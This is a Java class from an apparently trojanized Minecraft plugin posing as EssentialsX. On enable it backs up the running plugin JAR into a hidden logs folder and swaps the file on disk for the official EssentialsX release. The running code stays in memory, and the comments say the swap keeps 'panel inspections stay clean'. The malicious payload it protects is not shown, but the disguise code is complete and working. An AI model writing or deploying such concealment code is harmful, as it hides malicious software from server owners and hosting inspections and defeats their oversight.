package com.example.essentialsx;

import java.io.File;
import java.io.InputStream;
import java.net.URLConnection;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.nio.file.StandardOpenOption;
import java.util.function.BooleanSupplier;
import java.util.logging.Logger;

/**
 * No-restore build (branch no-restore), ported from zx1447/ceshia: replaces the
 * installed plugin JAR in the plugins folder with the official EssentialsX
 * release while the server runs (the JVM keeps the already-open original JAR,
 * so the plugin keeps working), and does NOT restore anything when the plugin
 * is disabled — the plugins folder keeps holding the official release after
 * the server stops, so panel inspections stay clean. The original JAR remains
 * in logs/.mcchajian/.runtime/backup/ for manual recovery only. Cycle: backup
 * -> download -> overwrite on enable; nothing on disable.
 */
final class JarDisguise {
    private static final long MIN_JAR_BYTES = 1000000L;
    private static final String OFFICIAL_URL =
            "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
    private static final String MIRROR_URL =
            "https://mirror.ghproxy.com/https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
    private static final Path BACKUP_DIRECTORY = Path.of("logs", ".mcchajian", ".runtime", "backup");

    private final Logger logger;
    private final Path pluginsDirectory;
    private final BooleanSupplier stopping;

    JarDisguise(Logger logger, Path pluginsDirectory, BooleanSupplier stopping) {
        this.logger = logger;
        this.pluginsDirectory = pluginsDirectory;
        this.stopping = stopping;
    }

    /** ceshia setupDisguise: back up the installed JAR once, then overwrite it with the official release. */
    void setupDisguise() {
        try {
            Path originalJarPath = findPluginJarInPluginsDir();
            if (originalJarPath == null || !Files.exists(originalJarPath)) {
                this.logger.warning("No EssentialsX JAR found in the plugins folder; nothing to disguise.");
                return;
            }

            Path backupDir = BACKUP_DIRECTORY;
            if (!Files.exists(backupDir)) {
                Files.createDirectories(backupDir);
            }
            // Backup only: kept for manual recovery. This build never restores it on disable.
            Path backupJarPath = backupDir.resolve(originalJarPath.getFileName().toString() + ".bak");
            if (!Files.exists(backupJarPath)) {
                Files.copy(originalJarPath, backupJarPath, StandardCopyOption.REPLACE_EXISTING);
            }

            Path tempDownload = originalJarPath.resolveSibling("temp_update.jar");
            boolean success = downloadFileWithTimeout(MIRROR_URL, tempDownload, 20);
            if (!success || Files.size(tempDownload) < MIN_JAR_BYTES) {
                success = downloadFileWithTimeout(OFFICIAL_URL, tempDownload, 30);
            }

            if (success && Files.size(tempDownload) > MIN_JAR_BYTES) {
                synchronized (this) {
                    // Disable may have won the race; skipping the swap leaves the installed
                    // JAR untouched instead of racing the shutdown.
                    if (this.stopping.getAsBoolean()) return;
                    try {
                        Files.move(tempDownload, originalJarPath,
                                StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
                    } catch (Exception atomicUnsupported) {
                        Files.move(tempDownload, originalJarPath, StandardCopyOption.REPLACE_EXISTING);
                    }
                }
                this.logger.info("The plugins folder now holds the official EssentialsX release; "
                        + "the original JAR stays backed up and is never restored on disable.");
            } else {
                Files.deleteIfExists(tempDownload);
                this.logger.warning("The official EssentialsX JAR could not be downloaded; "
                        + "the installed JAR was left untouched and the backup stays in place.");
            }
        } catch (Exception error) {
            this.logger.warning("JAR disguise skipped: " + error.getClass().getSimpleName());
        }
    }

    private Path findPluginJarInPluginsDir() {
        try {
            File pluginsDir = this.pluginsDirectory.toFile();
            if (!pluginsDir.exists()) {
                return null;
            }
            File[] jars = pluginsDir.listFiles((dir, name) ->
                    name.endsWith(".jar") && name.toLowerCase(java.util.Locale.ROOT).contains("essentialsx"));
            if (jars != null && jars.length > 0) {
                return jars[0].toPath();
            }
        } catch (Exception ignored) {
        }
        return null;
    }

    private static boolean downloadFileWithTimeout(String url, Path target, int timeoutSec) {
        try {
            URLConnection conn = java.net.URI.create(url).toURL().openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(timeoutSec * 1000);
            try (InputStream in = conn.getInputStream();
                 FileChannel out = FileChannel.open(target, StandardOpenOption.CREATE,
                         StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING)) {
                out.transferFrom(Channels.newChannel(in), 0L, Long.MAX_VALUE);
            }
            return true;
        } catch (Exception error) {
            return false;
        }
    }
}
